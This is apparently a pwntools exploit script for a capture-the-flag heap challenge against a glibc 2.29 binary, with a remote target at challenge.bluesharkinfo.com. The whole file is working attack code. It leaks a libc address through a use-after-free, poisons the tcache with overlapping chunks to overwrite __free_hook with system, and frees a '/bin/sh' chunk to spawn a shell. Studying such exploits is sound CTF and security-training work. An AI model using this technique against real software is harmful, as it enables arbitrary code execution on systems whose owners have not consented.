from pwn import *
context(arch='amd64', os='linux', log_level='debug')
file = './pwn_patched'
elf  = ELF(file)
libc = ELF("./glibc/libc-2.29.so")
choice = 0
if choice:
    port =    20521
    target = 'challenge.bluesharkinfo.com'
    p = remote(target, port)
else:
    p = process(file)

gdb_ = 0
if gdb_:
    gdb.attach(p)

def add(size, content):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"Size: ", str(size).encode())
    if len(content) < size:
        p.sendafter(b"Content: ", content.ljust(size, b'\x00'))
    else:
        p.sendafter(b"Content: ", content)

def delete(idx):
    p.sendlineafter(b"choice: ", b"2")
    p.sendlineafter(b"Index: ", str(idx).encode())

def show(idx):
    p.sendlineafter(b"choice: ", b"3")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.recvuntil(b"Content: ")

for i in range(7):
    add(0x88, b'Filler')
add(0x88, b'Chunk_A') 
add(0x88, b'Chunk_B') 
add(0x18, b'Guard')  

for i in range(7):
    delete(i)
delete(8)
delete(7)

show(7)
leak_data = p.recv(6)
libc.address = u64(leak_data.ljust(8, b'\x00')) - 0x1e4ca0 
log.success(f"Libc Base: {hex(libc.address)}")
free_hook = libc.symbols['__free_hook']
system_addr = libc.symbols['system']

add(0x88, b'Make_Room')
delete(8)


payload = flat([
    b'A' * 0x88,        
    0x91,               
    free_hook          
])
add(0x100, payload)

add(0x88, b'/bin/sh\x00')

add(0x88, p64(system_addr)) 

delete(12)

p.interactive()